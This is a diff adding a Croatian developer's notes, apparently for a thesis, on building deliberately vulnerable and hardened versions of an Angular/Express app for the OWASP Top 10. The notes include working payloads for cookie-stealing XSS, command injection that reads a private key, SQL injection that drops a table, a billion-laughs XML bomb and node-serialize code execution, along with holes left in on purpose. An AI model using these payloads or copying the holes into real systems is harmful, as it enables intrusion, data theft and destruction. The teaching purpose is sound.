@@ -1,0 +1,209 @@
+****1.) CSRF****
+
+-RANJIVA: -nikakve zaštite protiv csrf-a
+	-transakcija preko get (parametri iz linka) i post metode
+	-dodani primjeri ostvarenja csrfa (koristeci get i post metodu, obje za ostvarenje transakcije)
+	-oba napada kao linkovi u porukama, (napadac u linku šalje zahjtev za transakcijom novca)
+	-sameSite:none -> onemogucuje rad s cookijima (tako da ih uopce ni ne stavljaj)
+
+-SIGURNA: -implementirana double submit cookie zastita -> na klijentskoj strani se koristi httpclientXSRFmodule
+	-maknuta get funkcija koja mijenja stanje
+	-dodano traženje lozinke za osjetljive operacije
+	-dodan middleware koji provjerava csrf token na sve post, put, delete zahtjeve
+	-dodano provjeravanje refera
+	-dodani sameSite:strict atributi na cookie koji se salju
+	-vracena sigurna metoda za transakciju
+
+****2.)XSS****
+
+	-dodana evil (stranica za napade:csrf...) i secure aplikacija (Secursy, sadrži profile korisnika)
+	-dodan korisnikov link na profil na Secursy stranici (razvijena "dobra" aplikacija)
+
+-RANJIVA: -> POPRAVITI SANITIZACIJU NA SERVERU : MOGUCE DODAVANJE SKRIPTI!!
+	-nikakva validacija na tom linku
+	-dodan DOMsanitizer koji odsanatizira taj link tako da dopušta napade
+	-za sada oba 3 napada su Stored tipa, ostala 2 probati kasnije
+	-3 napada: 2 URL tipa (oba kao link na profil )i jedan HTML (trebao biti content poruke, ne moze, hardkodirano u poruke (jbg) -> razmotri customPipe iz knjige kao rjesenje)
+	-1. napad: 'javascript:document.cookie="SESSIONID=";document.body.innerHTML = "";' / kad korisnik klikne brise mu cookie sa sesijom (odlogiruje ga)
+	-za 2. napad, je funkcija slanja poruke napravljena kao get koja dobiva parametre iz linka
+	-2. napad: 'javascript:document.location="http://localhost:9000/api/addmessage/receiver=napadac@gmail.com&content="+document.cookie;document.body.innerHTML = "";', klikom na
+link korisnik šalje svoj cookie drugom korisniku koji ga može iskoristiti
+	-3. napad :'<svg onload="var i;for (i=0;i<50;++i){alert(404)}"></svg>'-> izbacuje 50x poruku
+
+
+-SIGURNA:
+	-dopuštati samo linkove sa sigurne stranice, sanatizirati unos kad se unosi i kad se dohvaca (tekst poruke i link profila) 
+ iz baze preko sanatize() metode -> this.sanitizer.sanitize(SecurityContext.URL,val.profileLink)
+	-2. napad:dodati httpOnly na cookie da sprijeci pristup cookieju
+	-vracena sigurna metoda za slanje poruka
+
+	-dodan AOT compiler: "start": "ng serve --aot --proxy-config ./proxy.json --ssl --ssl-key key.pem --ssl-cert cert.pem"
+	-dodan paaket "sanitizer" na BE (ne radi bas nest, al jbg)
+
+	-koristi se document.findElementById - ne znam jel to sigurno ili ne, ugl. preporucuje se renderer2 - ako budes imo vremena implementiraj to kasnije
+	-zadnji korak je razvijanje CSP-a, nije obavljeno -> update:obavljeno
+
+
+****3.)XSSI ****
+
+-RANJIVA:
+
+-SIGURNA: -dodano xssi middleware koje dodaje na pocetak svakog json responsa ")]}',\" tako da je svaki json respone neexecutabilan -> middleware se dodaje na svaki zahtjev koji salje response
+	  -Angularov httponlyClient automatski uklanja to
+	  -takoder potrebno dodati provjeru csrf tokena (nije obavljeno)
+	
+
+
+****4.) INJECTIONS *** -> validacija dodana u 12. -> literatura za custom validator: https://dzone.com/articles/how-to-create-custom-validators-in-angular,
+			https://angular.io/guide/form-validation#custom-validators, https://angular-templates.io/tutorials/about/angular-forms-and-validations
+
+	*COMMAND INJECTION* 
+		-> RANJIVA: -dodan dio koji omogucuje pinganje odredene ip adrese (nema nikakve validacije ni na FE ni BE)
+			    -primjeri napada: "127.0.0.1 && dir" - ispisuje sadržaj datoteka u aplikaciji
+			    - "127.0.0.1 && type key.pem" -> ispisuje sadržaj privatnog kljuca
+			    - "127.0.0.1 && ????" -> brise sve datoteke aplikacije (NACI POTREBNU NAREDBU)
+
+		-> SIGURNA: - nikako ne smije sadržavati listu onih znakova -> spomenuti u radu, to navesti kao primjer da je bolje whitelistati nego blacklistati
+			    - dodana validacija za provjeru ip adrese (min 7, max 15 znakova, regex koji provjerava je li input ispravna ip adresa)
+			    - ista stvar i na BE 
+
+	*SQL INJECTION*
+		-> RANJIVA: -dodana users komponenta gdje ima search za traženje korisnika po prezimenu
+			-sql u getUsers napisan kao: var sql = "SELECT * FROM user WHERE lastName = '" + input + "'";
+			-tako je omogucen sql injection
+			-' OR '1'='1 -> vraca sve rezultate
+			-ta jedina operacija radi s sqlite bazom, ne radi pokretanje vise operacija odjednom (namješteno da radi)
+			-'; DROP TABLE user -- -> briše tablicu user
+
+		-> SIGURNA: -korištenje parametriziranih queryja ->
+			    -polja za unos-> prezime nije duze od 25 znakova 
+			    -provjera podatka: provjera tipa podataka, provjera navodnika, provjera ;, provjera dvostrukih crtica, (provjera postojanja kljucnih sql naredbi) -> sve ove zaštite iz ferove skripte
+			    ->NAPRAVITI CUSTOM VALIDATOR -> [https://blog.thoughtram.io/angular/2016/03/14/custom-validators-in-angular-2.html]
+			    -napravljen custom validator (user-search.validator.ts -> provjerava sadrži li input ;,--,=,insert, drop table)
+			    -isto i na BE
+
+****5.) BROKEN AUTH ****
+
+-RANJIVA: -lozinka pohranjena kao tekst, nema nikakve validacije na svim inputima, sessionID u urlu (dovršiti do kraja), sesija ne istice i ne briše se nakon logouta
+	  -koristi se http i na BE i na FE, poruke koje odaju previse (dodano na loginu -> dodati i na ostala osjetljiva podrucja)
+	  -dodati pocetnu stateful implementaciju sesije (NIJE POTREBNO)
+	  -koristiti kao osnovu za ranjivu aplikaciju
+
+-SIGURNA : -šifra je haširana, sessionID nije u URlu, sessionID istice za 7200 (SAZNATI OPTIMALNO VRIJEME) -> dodan i maxAge atrbiut na cookie (u milisekundama -> RADI), BE i FE idu preko HTTPS-a
+	   -dodan googleov reCaptcha kao mjera za multiautentifikaciju
+	   -pokušan user lockdown nakon nekoliko neuspješnih pokušaja ulogiranja (neuspješno, nisam pronasao nijedan rezultat)
+	   -kod logiranja se koriste iste poruke za sve pogreske
+	   -dodan password policy kao custom validator -> po ovome radeno :https://codinglatte.com/posts/angular/cool-password-validation-angular/, https://codinglatte.com/posts/angular/angular-building-custom-validators/ -> o custom validatorima
+	   -dodati validaciju na BE (!)
+	   -dodati provjeru sa top 1000 losih lozinki (!)
+
+	   -> dodan authenticationGuard (u 12. dijelu implementiran)
+
+****6.) SENSITIVE DATA EXPOSURE****
+
+-RANJIVA: -dodan broj kartice kao primjer osjetljivog podatka
+	  -autocomplete:on na svakome koristicnog unosu (dodati na sve)
+	  -dodan res.set('Cache-Control', 'public'); header prije slanja osjetljivih podatka (dodati na sve)
+	  -ne koristi ssl (maknuti iz package.json)
+
+-SIGURNA: -autocomplete off na sve
+	  -res.set('Cache-Control', 'no-store'); header prije slanja osjetljivih podataka, za ostale stavi res.set('Cache-Control' ,'no-cache, max-age=0');
+	  -(jebada s privatnim kljucevima u algoritmima u https vezi -> PROVJERI TO DEFINITIVNO)
+	  -dodan HSTS header unutar middlewarea -> preko paketa hsts -> kasnije dodano preko helmeta
+	  -(bonus: enkripcija baze podatka -> ako budes imo vremena)
+
+
+****7.) XXE****
+
+-RANJIVA: -u addMessage dodano svojstvo da korisnik uploada poruku kao xml datoteku, mora sadržavati mail receivera i content
+	  -koristi se slabi xml parser (DOMParser)
+	  -primjer DOS napada, billion dollars laugh: 
+	<?xml version="1.0"?>
+	<!DOCTYPE lolz [
+	 <!ENTITY lol "lol">
+	 <!ELEMENT lolz (#PCDATA)>
+	 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+	 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+	 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+	 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+	 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+	 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+	 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+	 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+	 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+	]>
+	<message>
+		<receiver>mario@mail.hr</receiver>
+		<content>&lol9;</content> 
+	</message>
+
+-SIGURNA: - maknut xml parser, stavljeno da se uploada json object poruke
+	  - parsira je json i salje poruka
+
+****8.) SECURITY MISCONFIGURATION****
+
+-RANJIVA: - kao ispis greske daje cijeli stack trace (dodano na loginu, dodati i na druga mjesta)
+	  - The X-Powered-By : Express je defaultno postavljeno na svakom responsu od servera -> daje hakeeru moguce informacije
+	  -dodan directory listing na server
+	  -debbuging postoji na FE (automatski kad je u ddevelopment modu, enableProd() u main.ts postavlja u production modu u kojemu je debbuging onemogucen)
+	  -na expressu nisam naso kako iskljucit debug
+
+-SIGURNA: -genericne poruke bez stack tracea
+	  -disenablean x-powered by header (iz nekog razloga nemoguce, moze se samo postavit na neku vrijednost sto nista ne odaje)
+	  - nema directory listinga na serveru
+	  - debbuging iskljucen u angularu (production mode)
+          -dodani security headersi koje server salje klijentu (koristi se helmet paket, sadrzi 12 headera -> svi ugaseni trenutno, na kraju zakljuciti koje sve treba)
+
+****9.) INSECURE DESERIALIZATION****
+
+-RANJIVA: -unosi se fajl koji je formata kao json
+	  -deserijalizira ga node-serialize paket koji radi eval nad dobivenim
+	  -primjer napada: {
+		"receiver":"marko@mail.hr",
+		"amount":"_$$ND_FUNC$$_function (){require('child_process').exec('dir', function(error, stdout, stderr) { console.log(stdout) });}()"
+	}-> ispisat ce sadrzaj svih datoteka servera (moguci i ostali napadi iz shella)
+
+-SIGURNA: -ne serijalizirazi nista od korisnika, tj. odbaciti ovu vrstu servisa
+
+****10.) USING COMPONENTS WITH KNOWN VULNERABILITIES****
+
+-RANJIVA: - npm audit daje ispis o 6 ranjivih komponenti:found 6 vulnerabilities (5 low, 1 critical) in 28914 scanned packages,run `npm audit fix` to fix 1 of them.
+	  - neke od njih se mogu popraviti (instl drugih verzija)
+	  - primjer ranjive komponente je node-serialize iz 9.), dodatni primjer je i paket mathjs (nije dodan u app)
+	  - npm audit fix - popravio jednu , npm audit fix --force - popravio jos jednu -> 4 ostale, zahtjevaju manualno
+	  - za daljnja sranja pratio https://itnext.io/fixing-security-vulnerabilities-in-npm-dependencies-in-less-than-3-mins-a53af735261d + update protaract (pise u auditu) + opet npm install
+	  
+-SIGURNA : -npm audit: "found 5 low severity vulnerabilities"
+	   -http-server > optimist > minimist -> "# Run  npm install http-server@0.12.3  to resolve 1 vulnerability" -> POPRAVILO
+	   - dodao resulutions i scripts u package.json, pokrenuo npm install -> POPRAVILO SVE PROBLEME (npm audit ne pronalazi nijednu ranjivost)
+	
+****11.) LOGGING & MONITORING ****
+
+-RANJIVA: -nema sustav bilježenja i pracenja
+
+-SIGURNA: -dodan paket winston preko kojega se stvara log u koji se bilježe svi bitni dogadaji
+	  - leveli: info, error i warn
+	  - osim toga: [dodao novi modul za racunanje datuma (time-info.ts), prepravio kompletno kod na serveru i uredio]
+
+****12.) BROKEN ACCESS CONTROL ****
+
+
+-RANJIVA: -dodana adminPhotographs komponenta koja predstavlja adminski panel za slike (/api/admin/photographs), path za obicne korisnike je /api/user/photographs -> VERTIKALNA AUTORIZACIJA
+    	  -myTransactions promijenjeno kao mytranscations/moj@mail.hr -> HORIZONTALNA AUTORIZACIJA
+	  -fotografije i korisnici vidljivi i bez prethodnog logiranja (NIJE POTREBNO)
+   	  -uloge ne postoje, nikakve autorizacije nema
+
+-SIGURNA: -dodane 2 vrste uloga: user i admin, uloge se šalju putem jwta u cookiejau
+	  -neprijavljenom korisniku nista nije vidljivo
+	  -admin/photographs i user/photographs ne postoje
+	  -na BE dodan autorization middleware koji na prije propisanih funkcija provjerava odgovaraju li uloge, funkcije se dijele na one koje mogu izvoditi useri, admini ili oboje
+    	  -napravljena rbac direktiva koja provjerava ulogu trenutnog korisnika te ovisno o tome prikazuje ili ne html elemente korisniku (dodano na odgovarajuca mjesta)
+	  -napravljen authorization guard koji omogucuje odlazak na odredenu rutu samo ako se radi o odgovarajucoj ulozi (dodano na sva odgovarajuca mjesta)
+	  -dodan i httpInterceptor za greške (izlogira korisnika ukoliko je response 401 ili 403 -> probao ne radi zbog ciklicke ovisnosti sa AuthService) -> VIDJETI ZA KOJE JOŠ RANJIVOSTI SE MOŽE KORISTITI
+	  -na BE moguce jos i dodati provjeru refferer headera, tako da se na neki url moze doci jedino ako si prethodno bio na nekom prije urlu
+
+
+Offline template kompajler (AOT-compiler)
+
+Još jedna metoda koja pomaže u borbi protiv XSS napada je offline template kompajler. Osim što je koristan protiv njih, takoder I preventira ranjivosti umetanja predložaka (eng. Template injection) u kojima napadac može kontrolirati vrijednost koja se parsira od strane predloška te tada postoji sigurnosna ranjivost. Izvorni kod predloška (eng. Template source code) se nikada ne smije generirati spajanjem korisnikovog unosa i predložaka (dinamicko generiranje) te se I zbog toga preporucuje korištenje offline template kompajlera. Uz to, kompajler znacajno poboljšava performance aplikacije.
+Da bi se offline template kompajler dodao u Angular aplikaciju, potrebno je dodati “--aot” medu ng build I ng serve naredbe kojima se Angular aplikacija izgraduje, odnosno pokrece.
